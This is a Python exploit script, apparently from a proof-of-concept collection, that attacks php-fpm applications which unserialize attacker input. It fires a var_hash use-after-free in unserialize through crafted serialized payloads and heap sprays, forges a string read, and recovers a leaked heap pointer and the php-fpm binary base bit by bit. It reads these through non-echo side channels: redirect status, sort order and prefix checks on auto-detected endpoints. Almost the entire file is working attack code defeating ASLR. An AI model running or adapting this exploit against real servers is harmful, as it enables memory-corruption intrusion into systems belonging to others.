#!/usr/bin/env python3
# INDEX: auto-classify app sink, exfil pointer/binbase bits | fpm | needs app branching on decoded field
"""Read back an injected pointer/value through common non-echo php-fpm app
side-effect sinks (comparison/branch, not an echo).

Auto-classifies a target's sink by behavior (ordered access gate -> HTTP
status/redirect, usort/ORDER BY -> row permutation, prefix/equality check ->
status) and recovers the injected bytes as oracle bits: a leaked heap pointer
(masked to the 2MB chunk base) and, over a sort sink, the php-fpm binbase via one
forged IS_STRING read. Every probe to a sink is sent at an identical request
shape so the ASLR-bearing high bytes stay stable. Precondition: an app that
unserializes attacker data and branches on a decoded field. Pure stdlib,
`python3 -I` safe. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import math
import os
import re
import socket
import struct
import sys
import time
from urllib.parse import quote_from_bytes, urlsplit

# --- read-only imports of the proven building blocks ------------------------
_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_POC))  # poc/


def _load(fname):
    path = os.path.join(_POC, fname)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


_seo = _load("sideeffect_exfil_oracle.py")   # spray/payload + _dechunk (same folder)
_bb = _load("primitives/read_leak/fpm_binbase_leak.py")                 # binbase image-ptr offsets
from common.zend_mm import chunk_base, CHUNK_MASK  # noqa: E402

SPRAY_LEN = _seo.SPRAY_LEN           # 280
SPRAY_COUNT = _seo.SPRAY_COUNT       # 32
REF_BASE = _seo.REF_BASE             # 4
MAX_REFS = _seo.MAX_REFS             # 8
_C_PART = _seo._C_PART               # the CachedData var_hash UAF gadget
VOFF = _seo.DEFAULT_VOFF             # 40: byte offset of the leaked ptr in the field
PTR_BYTES = _seo.PTR_LOW_BYTES       # 6: low 48 bits of a canonical userspace ptr
FIELD_KEY = b"tok"                   # the named field each sink app branches on
GUESS_PAD = 64                       # fixed operand width -> constant request shape

# --- binbase (image-pointer) read geometry; re-derive per build -------------
# ZVAL_PTR_DTOR_OFF is the &zval_ptr_dtor image offset from the php-fpm .dynsym
# (readelf -sW). The element-0 object's offset inside the request's 2MB zend_mm
# chunk is a static, ASLR-independent layout constant, but it is SHAPE-DEPENDENT:
# the $_POST entries PHP allocates before unserialize() runs shift it, so each
# sink shape has its own object offset, measured once per build via the echo
# mirror.
ZVAL_PTR_DTOR_OFF = _bb.ZVAL_PTR_DTOR_OFF      # &zval_ptr_dtor image offset
OBJ_OFF_ORDERED = 0x5b1f8      # element-0 object: gate.php shape (payload+operand)
OBJ_OFF_SORT = 0x5b118         # element-0 object: order.php shape (payload+256 cand[])


# Payload builders (named-key variants of the var_hash UAF payloads)
def build_leak_payload():
    """var_hash UAF R: back-reference leak, with the reclaimed spray stored under
    the app's named field (FIELD_KEY) so a real app's `$result['tok']` reads back
    the sprayed string that ZVAL_MAKE_REF stamps the live heap pointer into (at
    byte offset VOFF). Returns (payload_bytes, spray_bytes)."""
    spray = _seo.build_spray()
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{_C_PART}'.encode('latin-1')]
    # first sprayed value under the NAMED key -> $result['tok']
    parts.append(b's:%d:"%s";s:%d:"' % (len(FIELD_KEY), FIELD_KEY, SPRAY_LEN)
                 + spray + b'";')
    for i in range(1, SPRAY_COUNT):
        parts.append(f'i:{i + 1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT + 1 + k};R:{REF_BASE + k};'.encode('latin-1'))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}', spray


def build_isstring_payload(fake_addr):
    """var_hash UAF forged-IS_STRING read, with the forged string reflected under
    the app's named field (FIELD_KEY): the R: back-reference is keyed 'tok', so a
    real app's `$result['tok']` returns the MEMORY the forged zend_string points
    at (len@fake+0x10, bytes@fake+0x18). Used to carry an image pointer -> binbase
    over the same comparison sink."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)
    vo = 8 + 1 * 32
    struct.pack_into('<Q', spray, vo, fake_addr)    # forged zend_string* ...
    struct.pack_into('<I', spray, vo + 8, 0x06)     # ... typed IS_STRING
    spray = bytes(spray)
    total = 1 + SPRAY_COUNT + 1
    parts = [f'i:0;{_C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i + 1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    parts.append(b's:%d:"%s";R:%d;' % (len(FIELD_KEY), FIELD_KEY, REF_BASE))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'


def build_plain(tok_bytes):
    """A BENIGN serialized array whose 'tok' field is a known plain string
    (no UAF). Used only by the behavioral DETECTORS to classify a live sink
    without firing the var_hash UAF."""
    return b'a:1:{s:%d:"%s";s:%d:"%s";}' % (len(FIELD_KEY), FIELD_KEY,
                                            len(tok_bytes), tok_bytes)


# HTTP transport
class Http:
    def __init__(self, host, port, timeout=8.0):
        self.host, self.port, self.timeout = host, port, timeout
        self.reqs = 0

    def post(self, path, fields):
        """fields: list[(bytes, bytes)]. Returns (status, location, body, dt)."""
        self.reqs += 1
        body = b'&'.join(quote_from_bytes(k).encode() + b'=' +
                         quote_from_bytes(v).encode() for k, v in fields)
        req = (f'POST {path} HTTP/1.1\r\nHost: {self.host}\r\n'
               f'Content-Type: application/x-www-form-urlencoded\r\n'
               f'Content-Length: {len(body)}\r\nConnection: close\r\n\r\n'
               ).encode() + body
        t0 = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        resp = b''
        try:
            s.connect((self.host, self.port))
            s.sendall(req)
            while True:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
        except OSError:
            pass
        finally:
            s.close()
        dt = time.time() - t0
        head, _, raw = resp.partition(b'\r\n\r\n')
        m = re.match(rb'HTTP/1\.[01] (\d{3})', head)
        status = int(m.group(1)) if m else 0
        lm = re.search(rb'(?im)^location:\s*(.*?)\r?$', head)
        location = lm.group(1).strip() if lm else b''
        return status, location, _seo._dechunk(head, raw), dt


# Sink adapters -- each drives ONE real-app pattern through its NATURAL request
# and parses its NATURAL observable.
class SinkAdapter:
    klass = None
    bits_per_req = None
    name = None

    def __init__(self, http, path):
        self.http = http
        self.path = path
        self.payload = b''

    def set_payload(self, payload):
        self.payload = payload

    def detect(self):
        """Return True iff a benign known-field probe behaves like this class."""
        raise NotImplementedError

    def truth_fields(self, payload, operand_width=GUESS_PAD):
        """The field list of a representative probe, for the VERIFIER to replay
        against /reflect.php so the echo ground truth is read at the SAME request
        shape (identical pre-unserialize allocation => identical reclaim slot).
        Non-echo exfil never calls this."""
        raise NotImplementedError


class GateAdapter(SinkAdapter):
    """session/cache ACCESS GATE: ordered strcmp(field, operand) -> 302+Location
    vs 403. 1 bit/request, binary-searchable. Observable: HTTP status (and the
    redirect Location, an independent same-endpoint channel)."""
    klass = 'ordered'
    bits_per_req = 1.0
    name = 'session/cache ordered gate (gate.php)'
    field_param = b'sess'
    operand_param = b'need'

    def _probe(self, guess):
        g = bytearray(GUESS_PAD)
        g[:min(len(guess), GUESS_PAD)] = guess[:GUESS_PAD]
        return self.http.post(self.path, [(self.field_param, self.payload),
                                           (self.operand_param, bytes(g))])

    def hit(self, guess):
        """True iff the decoded field sorts BELOW `guess` (strcmp < 0)."""
        st, _, _, _ = self._probe(guess)
        return st == 302

    def hit_via_location(self, guess):
        """Same bit read from the redirect Location instead of the status."""
        _, loc, _, _ = self._probe(guess)
        return loc.endswith(b'/area')

    def detect(self):
        self.set_payload(build_plain(b'M' * 8))
        hi = self.hit(b'\xff' * 8)     # field < all-high -> grant
        lo = self.hit(b'\x00' * 8)     # field < all-low  -> deny
        return hi and not lo

    def truth_fields(self, payload, operand_width=GUESS_PAD):
        return [(self.field_param, payload), (self.operand_param, bytes(operand_width))]


class OrderAdapter(SinkAdapter):
    """saved-view SORT / ORDER BY: usort(strcmp) over the decoded row merged with
    attacker candidate rows; observable is the LABEL permutation. The decoded
    row's rank among n candidates yields log2(n+1) bits in ONE request."""
    klass = 'sort'
    bits_per_req = math.log2(257)      # 256 candidates -> a byte per request
    name = 'saved-view sort / ORDER BY (order.php)'
    field_param = b'rows'
    operand_param = b'cand'

    def rank(self, anchors):
        """anchors: list[bytes]. Sent as an ordinary form array cand[]= so the
        candidate rows carry arbitrary bytes (incl. 0x0a) with no delimiter
        collision. Returns (rank_of_P, perm_labels)."""
        fields = [(self.field_param, self.payload)]
        fields += [(self.operand_param + b'[]', a) for a in anchors]
        _, _, body, _ = self.http.post(self.path, fields)
        perm = body.decode('latin-1', 'replace').split()
        rank = perm.index('P') if 'P' in perm else -1
        return rank, perm

    def detect(self):
        self.set_payload(build_plain(b'MMM'))
        rank, perm = self.rank([b'AAA', b'ZZZ'])     # expect A < M < Z -> P rank 1
        return rank == 1 and perm[:3] == ['a0', 'P', 'a1']

    def truth_fields(self, payload, operand_width=GUESS_PAD):
        # 256 candidates, matching the recovery's sort shape.
        return ([(self.field_param, payload)] +
                [(self.operand_param + b'[]', bytes(operand_width))] * 256)


class CheckAdapter(SinkAdapter):
    """entitlement PREFIX check: str_starts_with(field, operand) -> 204 vs 404.
    EQUALITY class: confirm-only (cannot binary-search), used as an INDEPENDENT
    non-echo channel to confirm a value an ordered/sort sink already recovered."""
    klass = 'equality'
    bits_per_req = 1.0
    name = 'entitlement prefix check (check.php)'
    field_param = b'ent'
    operand_param = b'want'

    def confirm(self, prefix):
        """True iff the decoded field STARTS WITH `prefix` (204)."""
        st, _, _, _ = self.http.post(self.path, [(self.field_param, self.payload),
                                                 (self.operand_param, prefix)])
        return st == 204

    def detect(self):
        self.set_payload(build_plain(b'MMMMM'))
        return self.confirm(b'MMM') and not self.confirm(b'QQQ')


# The CATALOG: common fpm app sink patterns that branch on an unserialized field.
CATALOG = [
    {'adapter': OrderAdapter, 'paths': ['/order.php', '/sort.php', '/list.php'],
     'real_world': 'usort/uasort/ORDER BY over decoded rows; leaderboard '
                   'position; merge/dedup order. Highest bandwidth.'},
    {'adapter': GateAdapter, 'paths': ['/gate.php', '/auth.php', '/session.php'],
     'real_world': 'session/cache gating on expiry/version/role/tier/token '
                   '(</<=); redirect routing on a decoded field; 200/403 flag.'},
    {'adapter': CheckAdapter, 'paths': ['/check.php', '/entitlement.php',
                                        '/verify.php'],
     'real_world': 'token/version === or str_starts_with; 204/404 on a decoded '
                   'flag. Confirm-only (independent cross-check channel).'},
]


# Runtime detection: probe + auto-classify by behavior.
def autodetect(http, extra_paths=(), log=print):
    """Probe candidate endpoints with a benign known field and classify each by
    BEHAVIOR (not by name). Returns {klass: adapter} for everything detected."""
    found = {}
    for entry in CATALOG:
        Ad = entry['adapter']
        for path in list(entry['paths']) + list(extra_paths):
            ad = Ad(http, path)
            try:
                ok = ad.detect()
            except Exception:
                ok = False
            if ok:
                if ad.klass not in found:
                    found[ad.klass] = ad
                    log(f"[detect] {path:16s} -> {ad.klass:8s} sink "
                        f"({Ad.bits_per_req:.1f} bits/req)  [{ad.name}]")
                break
    if not found:
        log("[detect] no comparison/branch sink classified on the probed paths")
    return found


# Byte recovery over a sink (the exfil itself -- NO echo)
def bisect_bytes(hit, prefix, voff, nbytes, log=None):
    """Recover nbytes of the decoded field via an ORDERED `hit(guess)->bool`
    (True iff field < guess). `prefix` is the field's KNOWN bytes before the
    recovery window (groom bytes up to VOFF for the leak; empty for a forged
    read whose pointer starts at byte 0)."""
    known = bytearray(prefix[:voff])
    out = bytearray()
    for pos in range(voff, voff + nbytes):
        lo, hi = 0, 256
        while lo < hi:
            mid = (lo + hi) // 2
            if hit(bytes(known) + bytes([mid])):
                hi = mid
            else:
                lo = mid + 1
        known.append(lo - 1)
        out.append(lo - 1)
        if log:
            log(f"    byte[{pos}] = 0x{lo - 1:02x}")
    return bytes(out)


def sort_recover(adapter, prefix, voff, nbytes, log=None):
    """Recover nbytes via the SORT rank: 256 candidates sharing the known prefix
    and differing at the target byte -> the decoded row's rank IS that byte
    (rank-1). One request per byte (~8 bits/req)."""
    known = bytearray(prefix[:voff])
    out = bytearray()
    for pos in range(voff, voff + nbytes):
        anchors = [bytes(known) + bytes([b]) for b in range(256)]
        rank, _ = adapter.rank(anchors)
        byte = (rank - 1) & 0xFF
        known.append(byte)
        out.append(byte)
        if log:
            log(f"    byte[{pos}] = 0x{byte:02x}  (sort rank {rank})")
    return bytes(out)


def recover_field(adapter, prefix, voff, nbytes, log=None):
    """Dispatch recovery by sink class. Returns the recovered bytes."""
    if adapter.klass == 'sort':
        return sort_recover(adapter, prefix, voff, nbytes, log)
    if adapter.klass == 'ordered':
        return bisect_bytes(adapter.hit, prefix, voff, nbytes, log)
    raise ValueError(f"{adapter.klass} sink is confirm-only; cannot recover")


def warmup(adapter, payload, rounds=4):
    """Bring the single worker's heap to its steady reclaim slot before reading
    (the first fires after (re)start reclaim a cold slot)."""
    adapter.set_payload(payload)
    if adapter.klass == 'ordered':
        for _ in range(rounds):
            adapter.hit(b'\x00')
    elif adapter.klass == 'sort':
        for _ in range(rounds):
            adapter.rank([b'\x00'])
    else:
        for _ in range(rounds):
            adapter.confirm(b'\x00')


# End-to-end exfil of the var_hash UAF leak through a non-echo sink
def exfil_chunk_pointer(adapter, log=print):
    """Fire the var_hash UAF R: leak so a live heap pointer lands in the app's
    decoded field, then recover its low 48 bits through the comparison sink.
    Returns (ptr_bytes_le, chunk_base)."""
    payload, spray = build_leak_payload()
    warmup(adapter, payload)
    adapter.set_payload(payload)
    log(f"[leak] firing a7 var_hash UAF via {adapter.name} ...")
    rec = recover_field(adapter, spray, VOFF, PTR_BYTES, log)
    ptr = int.from_bytes(rec + b'\x00' * (8 - len(rec)), 'little')
    chunk = chunk_base(ptr)
    log(f"[leak] recovered pointer low48 = 0x{rec.hex()}  (P=0x{ptr:x}, "
        f"chunk=0x{chunk:x})")
    return rec, chunk


def exfil_binbase(adapter, chunk, obj_off, log=print):
    """Carry the php-fpm binbase over the SAME non-echo sink: forge a var_hash UAF
    IS_STRING read of &zval_ptr_dtor at the element-0 object (chunk+obj_off-0x08)
    so the decoded field IS that image pointer, recover its bytes through the
    sink, derive binbase. `obj_off` is shape-specific (see OBJ_OFF_*). Returns
    (binbase, dtor, ptr_bytes) or (None, dtor, ptr_bytes).

    Routed through the SORT sink: the forged read (an IS_STRING pointing at image
    geometry) rides a 6-request (1 byte/req) sort recovery, versus ~48 for an
    ordered bisect. That matters because the forged-read payload is more
    crash-prone than the direct R: leak, and a single worker respawn mid-recovery
    re-randomizes ASLR and invalidates obj_off for every later probe; the sort
    channel's low request count keeps the recovery inside one worker lifetime."""
    obj = chunk + obj_off
    fake = obj - 0x20                       # data@fake+0x18 = obj-0x08 = &zval_ptr_dtor
    adapter.set_payload(build_isstring_payload(fake))
    log(f"[binbase] forged a7 read of &zval_ptr_dtor @ obj-0x08 "
        f"(obj=0x{obj:x}) via {adapter.klass} sink ...")
    rec = recover_field(adapter, b'', 0, PTR_BYTES, log)
    dtor = int.from_bytes(rec + b'\x00' * (8 - len(rec)), 'little')
    binbase = dtor - ZVAL_PTR_DTOR_OFF
    ok = binbase > 0 and (binbase & CHUNK_MASK) == 0
    log(f"[binbase] &zval_ptr_dtor = 0x{dtor:x} -> binbase = 0x{binbase:x} "
        f"(2MB-aligned={ok})")
    return (binbase if ok else None), dtor, rec


# Ground-truth helper (VERIFIER ONLY; reflect.php is the channel we avoid)
def reflect_field(http, fields, path='/reflect.php'):
    """Read the TRUE bytes of the decoded 'tok' field via the echo mirror, at the
    EXACT request shape the caller passes (use adapter.truth_fields()). Used ONLY
    by the verifier to score the non-echo recoveries; never on the exfil path.
    Returns the field bytes or None."""
    _, _, body, _ = http.post(path, fields)
    m = re.search(rb's:%d:"%s";s:(\d+):"' % (len(FIELD_KEY), FIELD_KEY), body)
    if not m:
        return None
    ln = int(m.group(1))
    d = m.end()
    return body[d:d + ln]


# Driver
def run(url, want_binbase=True, log=print):
    u = urlsplit(url if '://' in url else 'http://' + url)
    http = Http(u.hostname, u.port or 80)
    extra = [u.path] if u.path and u.path.endswith('.php') else []
    log(f"[*] target {http.host}:{http.port}")
    sinks = autodetect(http, extra_paths=extra, log=log)
    if not sinks:
        return 2

    # Prefer the highest-bandwidth RECOVERING sink (sort > ordered) for the main
    # exfil; equality sinks can only confirm.
    primary = sinks.get('sort') or sinks.get('ordered')
    if primary is None:
        log("[-] only an equality sink was found; it can confirm a value but "
            "cannot recover one from scratch. Need an ordered or sort sink.")
        return 1

    rec, chunk = exfil_chunk_pointer(primary, log=log)

    if want_binbase:
        sortsink = sinks.get('sort')
        if sortsink is not None:
            binbase, dtor, _ = exfil_binbase(sortsink, chunk, OBJ_OFF_SORT, log=log)
            if binbase is None:
                log("[binbase] not 2MB-aligned -> OBJ_OFF_SORT needs re-calibration "
                    "for this build/shape (verify ... --calibrate)")
        else:
            log("[binbase] skipped: needs a SORT sink (the forged image-pointer "
                "read is crash-sensitive over the 1-bit ordered channel's ~48 "
                "requests; the sort channel does it in ~6). An ordered-only "
                "target leaks the chunk pointer but not binbase this way.")

    log(f"[total] {http.reqs} requests")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument('--url', default='http://127.0.0.1:8153',
                    help='target base URL (optionally a specific .php path)')
    ap.add_argument('--no-binbase', action='store_true',
                    help='skip the forged-read binbase stage (chunk pointer only)')
    a = ap.parse_args(argv)
    return run(a.url, want_binbase=not a.no_binbase)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)